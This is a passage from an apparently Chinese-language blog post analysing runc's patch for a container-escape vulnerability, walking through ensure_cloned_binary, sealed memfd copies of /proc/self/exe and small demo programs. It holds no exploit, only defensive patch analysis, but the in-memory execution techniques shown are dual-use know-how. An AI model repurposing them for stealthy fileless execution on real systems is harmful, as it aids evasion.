#cgo CFLAGS: -Wall
extern void nsexec();
void __attribute__((constructor)) init(void) {
    nsexec();
}
*/
import &quot;C&quot;

</code></pre>

<p>这里用到了CGO：</p>
<pre><code>$ cat README.md
...
The `nsenter` package will `import &quot;C&quot;` and it uses [cgo](https://golang.org/cmd/cgo/) package. 

In cgo, if the import of &quot;C&quot; is immediately preceded by a comment, that comment, called the preamble, is used as a header when compiling the C parts of the package.
...

</code></pre>

<p>CGO简单说就是: 通过go调用C语言代码，语法是 import "C"语句+前面的注释(称为preamble)，preamble部分就是C语言代码(当C代码在不同文件时，preamble可以只写头文件引用)。
具体参考：
<a href="https://golang.org/cmd/cgo/">https://golang.org/cmd/cgo/</a>
<a href="https://bastengao.com/blog/2017/12/go-cgo-c.html">https://bastengao.com/blog/2017/12/go-cgo-c.html</a></p>
<p>上面的代码差不多是这样的效果：</p>
<pre><code>$ tree
.
├── cgo_c.c
└── cgo_example.go

0 directories, 2 files

$ cat cgo_c.c
#include &lt;stdio.h&gt;

void c_func1(){
    printf(&quot;Hello, CGO!\n&quot;);
}

void c_func2(){
    printf(&quot;Goodbye, CGO!\n&quot;);
}

$ cat cgo_example.go
package main

/*
extern void c_func1();
extern void c_func2();

void __attribute__((constructor)) init(void) {
    c_func1();
}

*/
import &quot;C&quot;

func main(){
    C.c_func2()
}

$ go build -o cgo
$ ./cgo
Hello, CGO!
Goodbye, CGO!


</code></pre>

<p>关于<code>__attribute__((constructor))</code>: 它是一个面向gcc的特性，功能是设置一个在main函数执行前执行的构造函数。</p>
<h5 id="_6">容器启动</h5>
<p>主要做的就是读取exec.fifo数据，让<code>runc init</code>继续执行</p>
<pre><code>// runc/libcontainer/container_linux.go -&gt; exec()

func (c *linuxContainer) exec() error {
    path := filepath.Join(c.root, execFifoFilename)
    pid := c.initProcess.pid()
    blockingFifoOpenCh := awaitFifoOpen(path)
    // ... 
    return handleFifoResult(result)
    // ...
}

</code></pre>

<pre><code>// runc/libcontainer/container_linux.go  -&gt; handleFifoResult()

func handleFifoResult(result openResult) error {
   // ...
   f := result.file
   readFromExecFifo(f)
   // ...
   return os.Remove(f.Name())
}

</code></pre>

<h4 id="runc-exec">runc exec</h4>
<p>runc执行一个容器进程的命令是: <code>runc exec</code>，它和<code>runc run</code>的流程相似，但不会创建新容器，而是通过id获取已经创建的容器，之后也会通过创建<code>runc init</code>进程对容器进程初始化，然后通过<code>syscall execve</code>将自己替换成要执行的容器进程。</p>
<h2 id="_7">补丁分析</h2>
<h4 id="_8">补丁概述</h4>
<p>简单总结就是：通过某种方式clone一个runc的<code>/proc/self/exe</code>的只读副本，该副本是一个只读的内存文件，然后重新执行clone出的内存文件，从而使runc进程的proc符号链接(<code>/proc/self/exe</code>)对应的是该内存文件副本。</p>
<p>为了修复这个漏洞，在runc源码<code>libcontainer/nsenter/nsexec.c</code> 文件的<code>nsexec</code>函数中增加了一个<code>ensure_cloned_binary</code>函数调用：</p>
<pre><code>if (ensure_cloned_binary() &lt; 0)
        bail(&quot;could not ensure we are a cloned binary&quot;);
</code></pre>

<p>它的实现在文件<code>libcontainer/nsenter/cloned_binary.c</code> 中：</p>
<pre><code>int ensure_cloned_binary(void)
{
   int execfd;
   ...
   int cloned = is_self_cloned();

   if (cloned &gt; 0 || cloned == -ENOTRECOVERABLE)
     return cloned;
   ...
   execfd = clone_binary();
   ...
   fexecve(execfd, argv, environ);
   ...
}

</code></pre>

<ul>
<li>ensure_cloned_binary函数首先通过is_self_cloned函数判断当前进程的可执行文件是否是cloned(这里的clone可以理解成复制文件，而不是clone一个子进程的那个clone)；</li>
<li>如果runc是第一次被执行，则会返回false，然后通过clone_binary函数复制/proc/self/exe文件；</li>
<li>最后通过fexecve重新启动当前进程，对应的可执行文件是复制后的文件；</li>
<li>下一次执行的时候，is_self_cloned函数会返回true，然后进入打补丁前的正常流程。</li>
</ul>
<h4 id="ensure_cloned_binary-is_self_cloned">ensure_cloned_binary-&gt;is_self_cloned</h4>
<p>is_self_cloned是如何判断当前文件是否是clone过的？</p>
<pre><code>#define RUNC_MEMFD_SEALS \
    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)


#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001  /* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002  /* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004  /* prevent file from growing */
#  define F_SEAL_WRITE  0x0008  /* prevent writes */
#endif


static int is_self_cloned(void)
{
    int fd, ret, is_cloned = 0;
    struct stat statbuf = {};
    struct statfs fsbuf = {};


    fd = open(&quot;/proc/self/exe&quot;, O_RDONLY|O_CLOEXEC);
    if (fd &lt; 0)
        return -ENOTRECOVERABLE;


    /*
     * Is the binary a fully-sealed memfd? We don't need CLONED_BINARY_ENV for
     * this, because you cannot write to a sealed memfd no matter what (so
     * sharing it isn't a bad thing -- and an admin could bind-mount a sealed
     * memfd to /usr/bin/runc to allow re-use).
     */
  // 通过获取文件的SEALS判断，当前可执行文件是不是设置过SEALS(只读，大小不可改变)的内存文件
  // 如果是通过make_execd的memfd_create的方式创建的clone文件，则is_clone会设置为true
    ret = fcntl(fd, F_GET_SEALS);
    if (ret &gt;= 0) {
        is_cloned = (ret == RUNC_MEMFD_SEALS);
        goto out;
    }


    // 检查是否设置了CLONED_BINARY_ENV
  // 这个环境变量会在父进程ensure_cloned_binary函数中设置
  // 如果没有设置则判断为第一次启动，当前可执行文件不是cloned
    if (!getenv(CLONED_BINARY_ENV)) {
        is_cloned = false;
        goto out;
    }


    /*
     * Is the binary on a read-only filesystem? We can't detect bind-mounts in
     * particular (in-kernel they are identical to regular mounts) but we can
     * at least be sure that it's read-only. In addition, to make sure that
     * it's *our* bind-mount we check CLONED_BINARY_ENV.
     */
  // 如果当前可执行文件在一个只读的filesystem，也可以判断是clone的文件
  // 通过try_bindfd方式创建的话，is_cloned会设置为true
    if (fstatfs(fd, &amp;fsbuf) &gt;= 0)
        is_cloned |= (fsbuf.f_flags &amp; MS_RDONLY);


    /*
     * Okay, we're a tmpfile -- or we're currently running on RHEL &lt;=7.6
     * which appears to have a borked backport of F_GET_SEALS. Either way,
     * having a file which has no hardlinks indicates that we aren't using
     * a host-side &quot;runc&quot; binary and this is something that a container
     * cannot fake (because unlinking requires being able to resolve the
     * path that you want to unlink).
     */
  // 如果当前可执行文件没有hardlinks也可以判断是clone的临时文件
    if (fstat(fd, &amp;statbuf) &gt;= 0)
        is_cloned |= (statbuf.st_nlink == 0);


out:
    close(fd);
    return is_cloned;
}


</code></pre>

<h4 id="ensure_cloned_binary-clone_binary">ensure_cloned_binary-&gt;clone_binary</h4>
<p>clone_binary是如何实现的？  </p>
<p>创建一个只读的，大小不可改变的临时内存文件，作为runc可执行文件的clone。</p>
<p>第一种方式是通过bind mount，见try_bindfd部分</p>
<pre><code>static int clone_binary(void)
{
    ...
    /*
     * Before we resort to copying, let's try creating an ro-binfd in one shot
     * by getting a handle for a read-only bind-mount of the execfd.
     */
  
    execfd = try_bindfd();
    if (execfd &gt;= 0)
        return execfd;
    ...
</code></pre>

<p>第二种方式: 当try_bindfd失败的时候通过make_execfd和seal_execfd来实现clone方案。</p>
<p>通过<code>make_exec</code>来创建一个内存文件，拷贝<code>/proc/self/exe</code>的数据后，通过<code>seal_execfd</code>对该内存文件设置限制使其只读。效果就是创建了一个只存在于内存中的<code>/proc/self/exe</code>的只读的clone文件。</p>
<pre><code>    /*
     * Dammit, that didn't work -- time to copy the binary to a safe place we
     * can seal the contents.
     */
    execfd = make_execfd(&amp;fdtype);
    ...
    binfd = open(&quot;/proc/self/exe&quot;, O_RDONLY | O_CLOEXEC);
    ...
    fstat(binfd, &amp;statbuf) 
    ...
    while (sent &lt; statbuf.st_size) {
        int n = sendfile(execfd, binfd, NULL, statbuf.st_size - sent);
        ...
        sent += n;
    }
    close(binfd);
    ...
    seal_execfd(&amp;execfd, fdtype)
    ...
    return execfd;
    ...
</code></pre>

<h5 id="clone_binary-try_bindfd">clone_binary-&gt;try_bindfd</h5>
<p>尝试将<code>/proc/self/exe</code>通过bind mount的方式bind到一个临时文件<code>/tmp/runc.xxxxxx</code></p>
<pre><code>static int try_bindfd(void)
{
  ...
  fd = mkstemp(template);
  ...   
  ret = -EPERM;
  if (mount(&quot;/proc/self/exe&quot;, template, &quot;&quot;, MS_BIND, &quot;&quot;) &lt; 0)
        goto out;
  
  ...
  if (mount(&quot;&quot;, template, &quot;&quot;, MS_REMOUNT | MS_BIND | MS_RDONLY, &quot;&quot;) &lt; 0)
        goto out_umount;
  
  ...
  ret = open(template, O_PATH | O_CLOEXEC);
out_umount:
    ...
    if (umount2(template, MNT_DETACH) &lt; 0) {
        if (ret &gt;= 0)
            close(ret);
        ret = -ENOTRECOVERABLE;
    }
  
out:
    ...
    unlink(template);
    return ret;
}
  
</code></pre>

<p>一个测试Demo:</p>
<pre><code>#define _GNU_SOURCE
#include &lt;sys/mount.h&gt;
#include &lt;time.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;   
#include &lt;sys/stat.h&gt;    
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
int main(){
    char template[1024] = &quot;./target.XXXXXX&quot;;
    int fd = mkstemp(template);
    printf(&quot;%d\n&quot;, fd);
    mount(&quot;/proc/self/exe&quot;, template, &quot;&quot;, MS_BIND, &quot;&quot;) ;
    mount(&quot;&quot;, template, &quot;&quot;, MS_REMOUNT | MS_BIND | MS_RDONLY, &quot;&quot;);
    int ret = open(template, O_PATH | O_CLOEXEC);
    printf(&quot;%d\n&quot;, ret);
    sleep(20);
    umount2(template, MNT_DETACH);
    printf(&quot;umounted\n&quot;);
    sleep(1000);
}

/*
$ sudo ./mount_umount_demo 
3
4

$ ls -l
...
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo
-rw-r--r-- 1 invincible invincible  551 Apr 14 20:39 mount_umount_demo.c
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 target.xIAgUt

$ sudo ./mount_umount_demo 
3
4
umounted

$ ls -l
...
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo
-rw-r--r-- 1 invincible invincible  551 Apr 14 20:39 mount_umount_demo.c
-rw------- 1 root       root          0 Apr 14 20:40 target.xIAgUt
invincible@ubuntu:~/Desktop/test/mount_test$ 
*/
</code></pre>

<h5 id="clone_binary-make_execfd">clone_binary-&gt;make_execfd</h5>
<p>这个方案中make_execfd创建内存文件也有三种方式：</p>
<ul>
<li>通过<code>memfd_create</code></li>
</ul>
<pre><code>#define RUNC_MEMFD_COMMENT &quot;runc_cloned:/proc/self/exe&quot;
#ifndef MFD_CLOEXEC
#  define MFD_CLOEXEC       0x0001U
#  define MFD_ALLOW_SEALING 0x0002U
#endif
static int make_execfd(int *fdtype)
{
    *fdtype = EFD_MEMFD;

    fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);

    if (fd &gt;= 0)
        return fd;
</code></pre>

<p>关于<code>memfd_create</code>：</p>
<pre><code>memfd_create() creates an anonymous file and returns a file
descriptor that refers to it.  The file behaves like a regular file,
and so can be modified, truncated, memory-mapped, and so on.
However, unlike a regular file, it lives in RAM and has a volatile
backing storage.
</code></pre>

<p>参考： <a href="https://cloud.tencent.com/developer/article/1551288">https://cloud.tencent.com/developer/article/1551288</a></p>
<ul>
<li>通过open 设置<code>O_TMPFILE</code> flag的方式创建临时文件</li>
</ul>
<pre><code>    *fdtype = EFD_FILE;
    fd = open(prefix, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);
    if (fstat(fd, &amp;statbuf) &gt;= 0)
    working_otmpfile = (statbuf.st_nlink == 0);
    if (working_otmpfile)
      return fd;
</code></pre>

<p>关于open函数的<code>O_TMPFILE</code>标志：</p>
<pre><code>O_TMPFILE (since Linux 3.11)
    Create an unnamed temporary regular file.  The pathname argu‐
    ment specifies a directory; an unnamed inode will be created
    in that directory's filesystem.  Anything written to the
    resulting file will be lost when the last file descriptor is
    closed, unless the file is given a name.
</code></pre>

<ul>
<li>通过mkostemp+unlink</li>
</ul>
<pre><code>    /*
     * Our final option is to create a temporary file the old-school way, and
     * then unlink it so that nothing else sees it by accident.
     */
    *fdtype = EFD_FILE;
    fd = mkostemp(template, O_CLOEXEC);
    if (fd &gt;= 0) {
        if (unlink(template) &gt;= 0)
            return fd;
</code></pre>

<p>关于<code>mkostemp</code>：简单的创建一个唯一名称的临时文件，并且可以使用<code>open</code>函数的部分flag</p>
<p>关于unlink:</p>
<pre><code>unlink() deletes a name from the filesystem.  If that name was the
last link to a file and no processes have the file open, the file is
deleted and the space it was using is made available for reuse.
</code></pre>

<h5 id="clone_binary-seal_execfd">clone_binary-&gt;seal_execfd</h5>
<ul>
<li>当<code>make_execfd</code>中通过<code>memfd_create</code>成功创建了内存文件时</li>
</ul>
<p>通过<code>fcntl</code>为文件添加<code>seals</code>，具体是使该内存空间不可扩大和缩小，不可写入，且该限制不可修改：</p>
<pre><code>#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001 /* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002 /* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004 /* prevent file from growing */
#  define F_SEAL_WRITE  0x0008 /* prevent writes */
#endif
#define RUNC_MEMFD_SEALS \
    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)
static int seal_execfd(int *fd, int fdtype)
{
    switch (fdtype) {
    case EFD_MEMFD:
        return fcntl(*fd, F_ADD_SEALS, RUNC_MEMFD_SEALS);
</code></pre>

<ul>
<li>如果是通过后两种方式创建的内存文件(<code>open</code> 设置<code>O_TMPFILE</code>或者<code>mkostemp+unlink</code>)</li>
</ul>
<p>会重新使用<code>open</code>设置<code>O_PATH</code> flag打开一次，这是为了让<code>execve</code>可用。</p>
<pre><code>    case EFD_FILE: {
        /* Need to re-open our pseudo-memfd as an O_PATH to avoid execve(2) giving -ETXTBSY. */
        int newfd;
        char fdpath[PATH_MAX] = {0};
        if (fchmod(*fd, 0100) &lt; 0)
            return -1;
        if (snprintf(fdpath, sizeof(fdpath), &quot;/proc/self/fd/%d&quot;, *fd) &lt; 0)
            return -1;
        newfd = open(fdpath, O_PATH | O_CLOEXEC);
        if (newfd &lt; 0)
            return -1;
        close(*fd);
        *fd = newfd;
        return 0;
    }
    default:
       break;
    }
    return -1;
}
</code></pre>

<p>关于<code>open</code> 的<code>O_PATH</code> flag：</p>
<pre><code>O_PATH (since Linux 2.6.39)
    ...
    One use of O_PATH for regular files is to provide the
    equivalent of POSIX.1's O_EXEC functionality.  This permits us
    to open a file for which we have execute permission but not
    read permission, and then execute that file, with steps
    something like the following:
    char buf[PATH_MAX];
    fd = open(&quot;some_prog&quot;, O_PATH);
    snprintf(buf, PATH_MAX, &quot;/proc/self/fd/%d&quot;, fd);
    execl(buf, &quot;some_prog&quot;, (char *) NULL);

    An O_PATH file descriptor can also be passed as the argument
    of fexecve(3).
</code></pre>

<p>demo1:</p>
<pre><code>//演示create_memfd + fexecve的方式
// 没有做异常处理
#define _GNU_SOURCE
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/sendfile.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/syscall.h&gt;
#define RUNC_MEMFD_COMMENT &quot;runc_cloned:/proc/self/exe&quot;
#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001  /* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002  /* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004  /* prevent file from growing */
#  define F_SEAL_WRITE  0x0008  /* prevent writes */
#endif
#define RUNC_MEMFD_SEALS \
    (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)

#ifndef F_LINUX_SPECIFIC_BASE
#  define F_LINUX_SPECIFIC_BASE 1024
#endif
#ifndef F_ADD_SEALS
#  define F_ADD_SEALS (F_LINUX_SPECIFIC_BASE + 9)
#  define F_GET_SEALS (F_LINUX_SPECIFIC_BASE + 10)
#endif

/* Use our own wrapper for memfd_create. */
#if !defined(SYS_memfd_create) &amp;&amp; defined(__NR_memfd_create)
#  define SYS_memfd_create __NR_memfd_create
#endif
/* memfd_create(2) flags -- copied from &lt;linux/memfd.h&gt;. */
#ifndef MFD_CLOEXEC
#  define MFD_CLOEXEC       0x0001U
#  define MFD_ALLOW_SEALING 0x0002U
#endif
int memfd_create(const char *name, unsigned int flags)
{
#ifdef SYS_memfd_create
    return syscall(SYS_memfd_create, name, flags);
#else
    errno = ENOSYS;
    return -1;
#endif
}

int main(int argc, char *argv[]){
    if(argc &gt; 1){
        if(strcmp(argv[1], &quot;stage2&quot;) == 0){ 
            printf(&quot;Stage 2 ok\n&quot;);
            return 0;
        }
        else{
            return -1;
        }
    }   
    // 通过memfd_create创建内存文件
    int fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);
    printf(&quot;%d\n&quot;, fd);
    // 把/proc/self/exe 复制到 memfd_create创建的内存文件
    int exefd = open(&quot;/proc/self/exe&quot;, O_RDONLY | O_CLOEXEC);
    size_t sent = 0;
    struct stat statbuf = {};
    fstat(exefd, &amp;statbuf);
    while (sent &lt; statbuf.st_size) {
        int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);
        sent += n;
    }
    close(exefd);
    printf(&quot;sent: %ldbytes\n&quot;, sent);
    // 添加seals约束    
    if(fcntl(fd, F_ADD_SEALS, RUNC_MEMFD_SEALS) &lt; 0){
        perror(&quot;fcntl error&quot;);
    }
    // 执行stage2
    char *env[] = {NULL};
    char *argv2[] = {&quot;&quot;, &quot;stage2&quot;, NULL};
    fexecve(fd, argv2, env);
    perror(&quot;fexecve error&quot;);
}
/*
$ gcc memfd_create_demo.c -o memfd
$ ./memfd 
3
sent: 9288bytes
Stage 2 ok
*/
</code></pre>

<p>demo2:</p>
<pre><code>// 演示open O_TEMPFILE + open O_PATH + fexecve的方式
// 没有做异常处理
#define _GNU_SOURCE
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
 #include &lt;sys/sendfile.h&gt;
int main(int argc, char *argv[]){
    if(argc &gt; 1){
        if(strcmp(argv[1], &quot;stage2&quot;) == 0){ 
            printf(&quot;Stage 2 ok\n&quot;);
            return 0;
        }
        else{
            return -1;
        }
    }
    struct stat statbuf = {};
    size_t sent = 0;
    char **environ;
    char *argv2[] = {&quot;opath&quot;, &quot;stage2&quot;, NULL};
    int fd = open(&quot;./&quot;, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);
    int exefd = open(&quot;/proc/self/exe&quot;, O_RDONLY | O_CLOEXEC);
    fstat(exefd, &amp;statbuf);
    while (sent &lt; statbuf.st_size) {
        int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);
        sent += n;
    }
    close(exefd);
    fchmod(fd, 0100);
    char fdpath[1024];
    snprintf(fdpath, sizeof(fdpath), &quot;/proc/self/fd/%d&quot;, fd);
    int newfd = open(fdpath, O_PATH | O_CLOEXEC);
    close(fd);
    fexecve(newfd, argv2, environ);
    // fexecve(fd, argv2, environ);
    perror(&quot;fexecve error&quot;);
}
/*
$ gcc open_opath_demo.c -o opath
$ ./opath 
Stage 2 ok
*/
</code></pre>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../../kernel/cve-2018-18281-分析/" class="btn btn-neutral float-right" title="Cve 2018 18281 分析">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cve-2019-5736-分析/" class="btn btn-neutral" title="Cve 2019 5736 分析"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>
    
  </div>

  <div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../cve-2019-5736-分析/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../../kernel/cve-2018-18281-分析/" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>
    <script src="../../js/theme.js"></script>

</body>
</html>
